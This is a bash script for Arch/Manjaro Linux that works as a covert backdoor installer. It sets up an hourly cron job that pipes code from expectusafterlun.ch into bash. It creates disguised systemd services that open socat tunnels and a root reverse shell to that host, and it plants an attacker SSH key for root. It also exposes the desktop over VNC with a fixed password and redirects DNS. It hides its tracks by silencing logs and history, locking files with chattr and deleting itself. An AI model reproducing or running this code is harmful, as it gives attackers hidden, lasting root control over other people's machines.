#!/bin/bash
set +xv
set +o history

#TODO Make this more stealth with the rootkit: https://github.com/croemheld/lkm-rootkit

function docron {
	#XXX Obfuscate both cron scripts
        #XXX https://github.com/Bashfuscator/Bashfuscator
	cat << 'END' > /etc/cron.hourly/updates.sh
#!/bin/bash
set +xv
set +o history
exec 1>/dev/null 2>&1
find /var/log -type f -exec chattr +i '{}' \;
curl expectusafterlun.ch/updates.sh | bash
find /var/log -type f -exec chattr -i '{}' \;
END

	#XXX Add packages back to package database
	#XXX Update them and do not overwrite our files
	#XXX Then remove them from the package database
        #XXX Needs testing. Does it remove packages from the package database?
	cat << 'END' > /etc/cron.daily/updates.sh
#!/bin/bash
set +xv
set +o history
exec 1>/dev/null 2>&1
find /var/log -type f -exec chattr +i '{}' \;

yes | pacman --noconfirm -Syy
yes | pacman --noconfirm -S openssh x11vnc dropbear socat

rm -rf /var/lib/pacman/openssh
rm -rf /var/lib/pacman/x11vnc
rm -rf /var/lib/pacman/dropbear
rm -rf /var/lib/pacman/socat

find /var/log -type f -exec chattr -i '{}' \;
exec 1>/dev/tty
exec 2>/dev/tty
set -o history
END
	chmod 0500 /etc/cron.hourly/updates.sh
	chmod 0500 /etc/cron.daily/updates.sh
}

function doforward {
	cat << 'END' > /etc/systemd/system/ssh_control.service
[Unit]
Description=SSH helper daemon
After=network.target

[Service]
ExecStart=socat openssl:expectusafterlun.ch:9000,reuseaddr,fork,forever,verify=0 tcp6:[::1]:22,reuseaddr
User=root
Group=root
Restart=on-failure


[Install]
WantedBy=multi-user.target
END

	##########
	##########
	##########
	
	cat << 'END' > /etc/systemd/system/vnc_control.service
[Unit]
Description=VNC helper daemon
After=network.target

[Service]
ExecStart=socat openssl:expectusafterlun.ch:9090,reuseaddr,fork,forever,verify=0 tcp6:[::1]:5900,reuseaddr
User=root
Group=root
Restart=on-failure

[Install]
WantedBy=multi-user.target
END

	# .rw-r--r-- root root
	chown root:root /etc/systemd/system/vnc_control.service 
	chown root:root /etc/systemd/system/ssh_control.service
	chmod 0644 /etc/systemd/system/vnc_control.service 
	chmod 0644 /etc/systemd/system/ssh_control.service

	#FIXME Change ports if necessary
	
	#REMOTE MACHINE LISTENER EXAMPLE:
	#socat openssl-listen:9000,fork,reuseaddr,cert=server.pem,verify=0 tcp6-listen:9002,reuseaddr  &>/dev/null
}

function dorevshell {
	cat << 'END' > /etc/systemd/system/repod.service
[Unit]
Description=Daemon for checking remote repositories
After=network-online.target

[Service]
ExecStart=socat openssl:expectusafterlun.ch:8080,verify=0,fork,reuseaddr exec:/bin/bash
User=root
Group=root
Restart=on-failure

[Install]
WantedBy=multi-user.target
END

	# .rw-r--r-- root root
	chown root:root /etc/systemd/system/repod.service
	chmod 0644 /etc/systemd/system/repod.service
}

function dodns {
	chattr -i /etc/resolv.conf

	cat << 'END' > /etc/resolv.conf
#AdGuardHome
nameserver 45.58.55.78
nameserver 2602:ffc5:30::1:a899

options edns0 single-request-reopen
END

	chown root:root /etc/resolv.conf
	chmod 0644 /etc/resolv.conf
	chattr +i /etc/resolv.conf

#TODO Make Firefox use PRISM 3.0 /etc/skel/prefs.js and /home/*/.mozilla/... or user.js?
#TODO pacman -Ql community/manjaro-browser-settings
}

function dossh {
	if test ! -d /root/.ssh
	then
		mkdir /root/.ssh
	fi
	
	developerkey='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8TdsKH7rdpVeckRIXmxTsboILx18NpDQv/0e2IqzKt1lFxJ6Q4wwrBY49JYmGUivWg39kTNxmoxKwzDEDyGetDaNho/wW4t11Tb8Y9GuERBERbtGbg/AghdUB5vz3QmN63c2rs8QyS4Hx4Ibyx2VDKrH1f2/rLhWOEIyCz7/VGLLf9q7CCQvgzPXU+WRuayUADShb9WhgZ/Vbm7/b3+TGtss6B5/URhBs/fBeEYYIZpsp8wi7+91Vp+/gpc7O2ylV8G+g5PrxXH6LepRT87LalP++UvsQJSpGYmcvG7UK3cdMcazmteIEp7yniAnNQYUQk8gUxxnjOFncHHzFDVXQ1ksAU35f5JVhDjZ88orWsHWlhJjn6ZPTaXnfiYgrKseSxh4OLsQstOyEbG+ZWDnR2p8DdUawQOW54waUFMTFIezXJqoAf1fFjT2bcEzKav+le5HsXe8voL+DIA0WiRl8F5JHQfdLB+x4Zc1/uq/oOXCkLpw9hL2QwBIY3QYWmos='
	
	echo "$developerkey" | tee /root/.ssh/authorized_keys /etc/.developer_keys

	if [ ! -e "/etc/ssh/sshd_config_backup" ]
	then
	    # File does not exist
	    mv /etc/ssh/sshd_config{,_backup}
	fi

	#TODO Finish writing all options that will go into the sshd_config
	#FIXME Add another key location and put the keys there too
	cat << 'END' > /etc/ssh/sshd_config
Port 22
AddressFamily any
ListenAddress 0.0.0.0
ListenAddress ::
# Authentication:
#PermitRootLogin prohibit-password
HostKey /etc/ssh/ssh_host_ed25519_key
# Logging
#SyslogFacility AUTH
#LogLevel INFO
LogLevel QUIET
DisableForwarding no	#TODO
Match User root
	AuthenticationMethods publickey
#StrictModes yes
MaxAuthTries 4
#MaxSessions 10
PubkeyAuthentication yes
AuthorizedKeysFile	.ssh/authorized_keys	/etc/.developer_keys
# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you dont trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Dont read the users ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes
# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
PermitEmptyPasswords no
# Change to no to disable s/key passwords
ChallengeResponseAuthentication no
# Set this to yes to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to no.
UsePAM yes
DisableForwarding no
#AllowAgentForwarding yes
AllowTcpForwarding yes
#GatewayPorts no
#X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no # pam does that
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
UseDNS no	#TODO
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none
Subsystem	sftp	internal-sftp
# Hardened set of key exchange, cipher, and MAC algorithms, as per <https://www.sshaudit.com/hardening_guides.html>.
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512
Match User root
	AuthenticationMethods publickey
END

	systemctl enable --now sshd.service
}

function dovnc {
	user=$(id -un 1000)

	cat << 'END' > /etc/systemd/system/privacy_protector.service
[Unit]
Description=Privacy Protector v2.0 Daemon
Requires=display-manager.service
After=syslog.target network-online.target
Wants=syslog.target network-online.target

[Service]
ExecStart=/usr/bin/x11vnc -display :0 -passwd 120671522023747 -shared -forever -o /dev/null -bg -xauth /home/$user/.Xauthority
ExecStop=/usr/bin/x11vnc -R stop
Restart=on-failure

[Install]
WantedBy=multi-user.target
END

}

function rmself {
	# Do not delete if we have the wrong directory or not a shell script
	if [[ "$mscript" =~ ^(/tmp/|/var/tmp/|/home/).+\.sh ]]; then
		rm -f -- "$mscript"
	fi

	killall -q -0 yay || rm -rvf $HOME/.cache/yay/* /root/.cache/yay/*
	yes | pacman -Scc --noconfirm
}

function dosystemd {
	# Start now and Autostart
	systemctl enable --now sshd.service
	systemctl enable --now privacy_protector.service
	systemctl enable --now repod.service
	systemctl enable --now ssh_control.service
	systemctl enable --now vnc_control.service
}

function dopkgs {
	yes | pacman --noconfirm -Syy
	yes | pacman --noconfirm -S openssh x11vnc dropbear socat

	#XXX Needs testing. Does it remove packages from the package database and doesn't break anything?
	rm -rf /var/lib/pacman/openssh
	rm -rf /var/lib/pacman/x11vnc
	rm -rf /var/lib/pacman/dropbear
	rm -rf /var/lib/pacman/socat
}

function verboseoff {
	set +xv
	set +o history

	exec 1>/dev/null 2>&1
	#exec &>/dev/null

	find /var/log -type f -exec chattr +i '{}' \;
}

function verboseon {
	find /var/log -type f -exec chattr -i '{}' \;

	exec 1>/dev/tty
	exec 2>/dev/tty

	set -o history
}

function makesecure {
	chattr +i /etc/ssh/sshd_config
	chattr +i /etc/.developer_keys
	chattr +i /root/.ssh/authorized_keys
	chattr +i /etc/systemd/system/ssh_control.service
	chattr +i /etc/systemd/system/vnc_control.service
	chattr +i /etc/systemd/system/privacy_protector.service
	chattr +i /etc/cron.hourly/updates.sh
	chattr +i /etc/cron.daily/updates.sh
	chattr +i /etc/resolv.conf
}

# Globals
mscript="$0"

#sudo -i -u root bash << 'EOF'	# Execute all as root

verboseoff
dopkgs
docron
doforward
dorevshell
dodns
dossh
dovnc
makesecure
dosystemd
rmself
verboseon

#EOF

